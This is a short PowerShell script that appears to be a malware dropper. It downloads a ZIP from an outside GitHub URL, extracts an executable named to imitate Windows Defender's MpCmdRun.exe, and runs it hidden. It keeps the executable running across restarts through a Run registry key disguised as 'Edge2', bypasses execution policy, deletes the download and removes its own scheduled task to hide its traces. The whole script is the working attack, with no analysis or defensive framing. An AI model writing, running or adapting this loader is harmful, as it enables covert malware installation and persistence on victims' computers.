# Set variables
$tempPath = [System.IO.Path]::GetTempPath()
$zipUrl = "https://raw.githubusercontent.com/jusnih/x/refs/heads/main/WOW64.zip"      # <-- Replace with your actual .zip URL
$zipFile = Join-Path $tempPath "WOW64.zip"
$extractPath = Join-Path $tempPath "WOW64"

$exePath = Join-Path $extractPath "MpCmdRun.exe"

# Download the .zip file
Write-Host "Downloading ZIP file..."
Invoke-WebRequest -Uri $zipUrl -OutFile $zipFile

# Extract the .zip file
Write-Host "Extracting ZIP to: $extractPath"
Expand-Archive -Path $zipFile -DestinationPath $extractPath -Force

# OPTIONAL: Do something with the extracted files
#Write-Host "Extracted contents:"
#Get-ChildItem -Path $extractPath


## Persistence:

Write-Host "EXE Path: $exePath"

if (Test-Path $exePath) {

    $regKeyPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $regValueName = "Edge2"

    Set-ItemProperty -Path $regKeyPath -Name $regValueName -Value "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$exePath`""

    Start-Process -WindowStyle Hidden $exePath

} else {
    Write-Host "Failed to download the script."
}


# Delete the extracted folder
# Write-Host "Deleting folder: $extractPath"
# Remove-Item -Path $extractPath -Recurse -Force

# Delete the zip file too (optional)
Remove-Item -Path $zipFile -Force

# Self-remove scheduled task after execution
Unregister-ScheduledTask -TaskName "1WOW64" -Confirm:$false

Write-Host "Done."
